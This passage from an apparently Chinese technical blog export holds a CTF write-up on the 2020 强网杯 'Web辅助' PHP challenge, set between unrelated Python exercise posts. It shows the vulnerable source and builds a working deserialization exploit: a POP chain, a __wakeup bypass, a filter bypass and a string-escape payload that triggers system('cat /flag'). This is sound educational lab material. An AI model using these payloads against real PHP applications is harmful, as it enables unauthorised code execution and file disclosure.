src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220701105231.png" /></p>
<ul>
<li>不会改变相对顺序</li>
</ul>
<h3 id="删除索引">10.1.3. 删除索引</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l1 = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">7</span>]</span><br><span class="line">l2 = l1[:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l1:</span><br><span class="line">	<span class="keyword">while</span> l2.count(i) &gt; <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">del</span> l2[l2.index(i)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(l2)</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220701105708.png" /></p>
<ul>
<li>这种办法通过比对每次遇到的元素是否重复，重复则删除，因此去除的都是重复元素中在前面的，保留最后一个，所以必定改变顺序。可以使用
<code>sort(key=l1.index)</code> 来保持顺序</li>
</ul>
<h3 id="列表生成器辅助">10.1.4. 列表生成器辅助</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l1 = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">7</span>]</span><br><span class="line">l2 = []</span><br><span class="line">[l2.append(i) <span class="keyword">for</span> i <span class="keyword">in</span> l1 <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> l2]</span><br><span class="line"><span class="built_in">print</span>(l2)</span><br></pre></td></tr></table></figure>
<ul>
<li>这也是不改变顺序的</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python 练习</tag>
      </tags>
  </entry>
  <entry>
    <title>POP链</title>
    <url>/2022/04/15/POP%E9%93%BE/</url>
    <content><![CDATA[<p>个人知识点记录。</p>
<span id="more"></span>
<h1 id="魔术方法">魔术方法</h1>
<p>可以参考一下：[[反序列化知识点#2 常见的魔术方法|常见魔术方法]]</p>
<p>常见的魔术方法是构造POP链得到关键！</p>
<h1 id="寻找pop链">寻找POP链</h1>
<p>POP链构造首先就是要找到头和尾，也就是用户能传入参数的地方（头）和最终要执行函数方法的地方（尾）。找到头尾之后进行反推过程，从尾部开始一步步找到能触发上一步的地方，直到找到传参处，此时完整的POP链就显而易见了。CTF赛中一般尾部就是get
flag的方法，头部则是GET/POST传参。</p>
<p>题目：2020强网杯-Web辅助</p>
<p>源码如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span>, <span class="variable">$admin</span> = <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="variable">$admin</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_admin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;Riven&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">TP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">&quot;function&quot;</span> <span class="keyword">or</span> gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">&quot;object&quot;</span>)&#123; <span class="comment"># gettype()获取变量类型</span></span><br><span class="line">            <span class="variable">$name</span> = <span class="keyword">$this</span>-&gt;name; </span><br><span class="line">            <span class="variable">$name</span>(); <span class="comment"># 可以触发 __invoke()</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; <span class="comment"># 当程序结束时，自动执行这个（存在该类对象），从而调用TP（）</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;TP(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;name !== <span class="string">&#x27;Yasuo&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">&#x27;Yasuo&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;No Yasuo! No Soul!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Gank();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Gank</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;name, <span class="string">&#x27;Yasuo&#x27;</span>))&#123; <span class="comment"># stristr() 搜索字符串在另一字符串中的第一次出现,this-&gt;name被当作字符串，从而触发__toString()</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Are you orphan?\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Must Be Yasuo!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&quot;Lee Sin&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">KS</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="string">&quot;cat /flag&quot;</span>); <span class="comment"># POP链尾部</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123; <span class="comment"># 调用这个魔术方法从而调用KS()得到flag</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;KS();  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// common.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = str_replace(<span class="string">&#x27;\0*\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&quot;*&quot;</span>.chr(<span class="number">0</span>), <span class="variable">$data</span>); <span class="comment"># protected和private的属性被序列化时必须包含\0。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = str_replace(chr(<span class="number">0</span>).<span class="string">&quot;*&quot;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0*\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$data</span>, <span class="string">&#x27;name&#x27;</span>)!==<span class="literal">False</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Name Pass\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$player</span> = <span class="keyword">new</span> player(<span class="variable">$username</span>, <span class="variable">$password</span>); <span class="comment"># POP链头部</span></span><br><span class="line">    file_put_contents(<span class="string">&quot;caches/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]), write(serialize(<span class="variable">$player</span>))); </span><br><span class="line">    <span class="keyword">echo</span> sprintf(<span class="string">&#x27;Welcome %s, your ip is %s\n&#x27;</span>, <span class="variable">$username</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Please input the username or password!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// play.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line">@<span class="variable">$player</span> = unserialize(read(check(file_get_contents(<span class="string">&quot;caches/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>])))));</span><br><span class="line">print_r(<span class="variable">$player</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$player</span>-&gt;get_admin() === <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;FPX Champion\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;The Shy unstoppable\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>先看index.php文件，里面的<code>$player = new player($username, $password);</code>构成了POP链的头部。然后看<code>class.php</code>，首先注意到<code>system("cat /flag");</code>，这就是POP链的尾部。接下来就从尾到头把POP链寻找出来：</p>
<ol type="1">
<li><p>要想执行<code>system("cat /flag");</code>，必须调用<code>jungle</code>类中的<code>KS()</code>方法，在同一个类中，存在着一个<code>__toString()</code>的魔术方法正好调用了<code>KS()</code>。</p></li>
<li><p>接下来需要找到哪里能够调用<code>__toString()</code>，当<code>jungle</code>类被当作字符串时，就会执行该魔术方法。<code>midsolo</code>类中的<code>stristr($this-&gt;name, 'Yasuo')</code>，如果<code>this_name</code>为<code>jungle</code>，则能够触发<code>__toString()</code>。因此，接下来需要寻找如何调用<code>midsolo</code>类中的<code>Gank()</code>方法。</p></li>
<li><p><code>midsolo</code>类中的<code>Gank()</code>方法被同一类中的<code>__invoke()</code>魔术方法调用，当<code>midsolo</code>类被当作函数执行的时候，就会自动调用该魔术方法。而<code>topsolo</code>类中的<code>TP()</code>方法中的<code>$name();</code>能够将类当作函数执行，只需要将该类中的<code>$name</code>设置为<code>midsolo</code>即可。而<code>TP()</code>方法被<code>__destruct()</code>魔术方法调用，也就是当程序结束时，如果创建过<code>topsolo</code>类对象，则会自动调用<code>__destruct()</code>魔术方法，从而直接顺着POP链get
flag。</p></li>
<li><p>POP链到这就出现了断层，那就是我们传入的是<code>player</code>类，而不是<code>topsolo</code>类，现在需要思考的就是如何从一个类跳到另一个类！这里就涉及到<strong>反序列化字符串逃逸</strong>！</p></li>
<li><p>将思路整理如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建topsolo类对象，结束时触发__destruct，调用TP </span><br><span class="line">--&gt; TP中的$name()调用__invoke，从而调用Gank </span><br><span class="line">--&gt; Gank中的stristr调用了__toString，从而调用了KS，并执行system(&#x27;cat /flag&#x27;)</span><br><span class="line">--&gt; 输出flag，结束</span><br></pre></td></tr></table></figure></p></li>
</ol>
<h1 id="构造payload">构造payload</h1>
<hr />
<p>复现环境：</p>
<ul>
<li>Windows11</li>
<li>phpstudy2018</li>
<li><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220415144817.png" /></li>
</ul>
<p>注意：版本不能太低，否则有的魔术方法不会生效。如果跟我一样，就需要把<code>system(cat /flag)</code>稍作修改。</p>
<hr />
<p>然后进行代码审计，整体过程简化如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$player</span> = <span class="keyword">new</span> player(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">file_put_contents(<span class="string">&quot;caches/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]), write(serialize(<span class="variable">$player</span>)));</span><br><span class="line">@<span class="variable">$player</span> = unserialize(read(check(file_get_contents(<span class="string">&quot;caches/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>])))));</span><br></pre></td></tr></table></figure></p>
<p>注意到过程中有三个函数<code>read</code>，<code>write</code>，<code>check</code>，在序列化时，调用<code>write</code>函数<code>$data = str_replace(chr(0)."*".chr(0), '\0*\0', $data);</code>将3个字符变成5个字节；然后在反序列化时，调用<code>read</code>函数<code>$data = str_replace('\0*\0', chr(0)."*".chr(0), $data);</code>，将5个字节变为3个字节。</p>
<p>生成password中需要传入的topsolo的序列化后的字符串代码：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> midsolo();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> jungle;  </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&quot;Lee Sin&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> topsolo(<span class="variable">$b</span>); <span class="comment"># 触发__invoke</span></span><br><span class="line">print_r(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;topsolo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;%00*%00name&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;midsolo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;%00*%00name&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;jungle&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;%00*%00name&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;Lee Sin&quot;</span>;&#125;&#125;&#125; <span class="comment"># *号前后还有看不见的\0，%00是\0经过url编码的结果</span></span><br></pre></td></tr></table></figure></p>
<p>修改midsolo类属性个数绕过<code>__wakeup</code>，修改name属性为16进制，并且需要把小写的s改为大写S绕过<code>check</code>函数
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POC: O:<span class="number">7</span>:<span class="string">&quot;topsolo&quot;</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">&quot;%00*%00nam\65&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;midsolo&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">7</span>:<span class="string">&quot;%00*%00nam\65&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;jungle&quot;</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">&quot;%00*%00nam\65&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;Lee Sin&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>生成一个正常的player类的序列化字符串： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span>, <span class="variable">$admin</span> = <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = <span class="string">&#x27;hdf&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = <span class="string">&#x27;sdfsdfsdfsdfsdfsdfsdfasdfasddfasfewafs&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="variable">$admin</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_admin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> player(<span class="string">&#x27;hdf&#x27;</span>，<span class="string">&#x27;O:7:&quot;topsolo&quot;:1:&#123;S:7:&quot;%00*%00nam\65&quot;;O:7:&quot;midsolo&quot;:2:&#123;S:7:&quot;%00*%00nam\65&quot;;O:6:&quot;jungle&quot;:1:&#123;S:7:&quot;%00*%00nam\65&quot;;s:7:&quot;Lee Sin&quot;;&#125;&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">print</span>(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;player&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;%00*%00user&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;hdf&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00*%00pass&quot;</span>;s:<span class="number">127</span>:<span class="string">&quot;O:7:&quot;</span>topsolo<span class="string">&quot;:1:&#123;S:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>nam\<span class="number">65</span><span class="string">&quot;;O:7:&quot;</span>midsolo<span class="string">&quot;:2:&#123;S:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>nam\<span class="number">65</span><span class="string">&quot;;O:6:&quot;</span>jungle<span class="string">&quot;:1:&#123;S:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>nam\<span class="number">65</span><span class="string">&quot;;s:7:&quot;</span>Lee Sin<span class="string">&quot;;&#125;&#125;&#125;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;%00*%00admin&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们需要把<code>O:7:"topsolo"......:7:"Lee Sin";&#125;&#125;&#125;</code>字符串放到<code>pass</code>属性中，也就是如下：（为了方便，我做了分行，<code>[]</code>中的内容是原来没有，我添加的）
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;player&quot;</span>:<span class="number">3</span>:&#123;</span><br><span class="line">s:<span class="number">7</span>:<span class="string">&quot;%00*%00user&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;hdf&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00*%00pass&quot;</span>;s:<span class="number">127</span>:<span class="string">&quot;</span></span><br><span class="line"><span class="string">[;s:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>pass<span class="string">&quot;;]O:7:&quot;</span>topsolo<span class="string">&quot;:1:&#123;S:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>nam\<span class="number">65</span><span class="string">&quot;;O:7:&quot;</span>midsolo<span class="string">&quot;:2:&#123;S:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>nam\<span class="number">65</span><span class="string">&quot;;O:6:&quot;</span>jungle<span class="string">&quot;:1:&#123;S:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>nam\<span class="number">65</span><span class="string">&quot;;s:7:&quot;</span>Lee Sin<span class="string">&quot;;&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;%00*%00admin&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>从上面可以看出，<code>user</code>的值应该为<code>hdf";s:7:"%00*%00pass";s:127:</code>，除了本身的<code>hdf</code>还需要包含22个字符，每个read都会减少2个字符，因此需要read
11次，也就是<code>username</code>应该为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hdf\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0</span><br></pre></td></tr></table></figure></p>
<p>那么password就该为（把方框的内容添上）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;s:7:&quot;%00*%00pass&quot;;O:7:&quot;topsolo&quot;:1:&#123;S:7:&quot;%00*%00nam\65&quot;;O:7:&quot;midsolo&quot;:2:&#123;S:7:&quot;%00*%00nam\65&quot;;O:6:&quot;jungle&quot;:1:&#123;S:7:&quot;%00*%00nam\65&quot;;s:7:&quot;Lee Sin&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>最终payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=hdf\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password=;s:7:&quot;%00*%00pass&quot;;O:7:&quot;topsolo&quot;:1:&#123;S:7:&quot;%00*%00nam\65&quot;;O:7:&quot;midsolo&quot;:2:&#123;S:7:&quot;%00*%00nam\65&quot;;O:6:&quot;jungle&quot;:1:&#123;S:7:&quot;%00*%00nam\65&quot;;s:7:&quot;Lee Sin&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>admin</code>无所谓，不影响结果。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220415144241.png" /></p>
<p>然后访问<code>play.php</code>文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220415144222.png" /></p>
<p>这里我将<code>system(cat /flag)</code>改为<code>echo('you get the flag!!!')</code>，因为复现的主机是Windows，并且不存在flag文件。</p>
<p>当然还有许多构造payload的方法，不过都是大同小异。本题考察的知识点非常的多，几乎涉及了PHP反序列化的所有知识点，字符串逃逸、POP链、进制绕过、魔术方法绕过</p>
<h1 id="相关题目">相关题目</h1>
<ol type="1">
<li>POP链简单应用：[[MRCTF2020 Ezpop]]</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP反序列化</tag>
        <tag>POP链</tag>
      </tags>
  </entry>
  <entry>
    <title>Question 11-20</title>
    <url>/2022/07/02/Question%2011-20/</url>
    <content><![CDATA[<p>项目地址：<a
href="https://github.com/ReganQing/Python-programming-exercises/blob/master/100%2B%20Python%20challenging%20programming%20exercises%20for%20Python%203.md">Python-programming-exercises/100+
Python challenging programming exercises for Python 3.md at master ·
ReganQing/Python-programming-exercises · GitHub</a></p>
<p>分为三个等级：</p>
<ol type="1">
<li>easy</li>
<li>medium</li>
<li>hard</li>
</ol>
<span id="more"></span>
<h1 id="question-11">1. Question 11</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>接收一串以逗号作为分隔的 4bit 二进制数字组成的字符串，返回其中能被 5
整除的数字，同样以逗号作为分隔。比如输入：0100,0011,1010,1001，输出为：1010</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = <span class="built_in">list</span>()</span><br><span class="line">binary_nums = [num <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">input</span>().split(<span class="string">&#x27;,&#x27;</span>)]</span><br><span class="line"><span class="keyword">for</span> binary_num <span class="keyword">in</span> binary_nums:</span><br><span class="line">    num = <span class="built_in">int</span>(binary_num, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> num % <span class="number">5</span> == <span class="number">0</span>:</span><br><span class="line">        res.append(binary_num)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;,&#x27;</span>.join(res))</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：</p>
<ul>
<li>将一个字符串类型的二进制数字转为 10 进制</li>
</ul>
<h2 id="int-函数">1.1. int() 函数</h2>
<p>作用：将一个字符串活数字转为整形（10 进制）</p>
